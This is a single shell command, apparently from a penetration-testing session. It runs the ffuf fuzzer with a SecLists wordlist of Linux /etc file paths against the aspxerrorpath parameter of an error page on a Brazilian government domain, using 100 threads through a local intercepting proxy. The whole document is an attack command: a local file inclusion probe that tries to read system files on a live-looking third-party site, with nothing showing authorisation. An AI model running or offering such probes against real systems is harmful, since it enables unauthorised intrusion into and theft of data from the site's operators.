```
ffuf -u "https://www.abc.gov.br/Training/Erro404.aspx?aspxerrorpath=FUZZ" \
-w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt \
-fs 0 -fw 10 -t 100 \
-x http://127.0.0.1:8080 \
-k
```
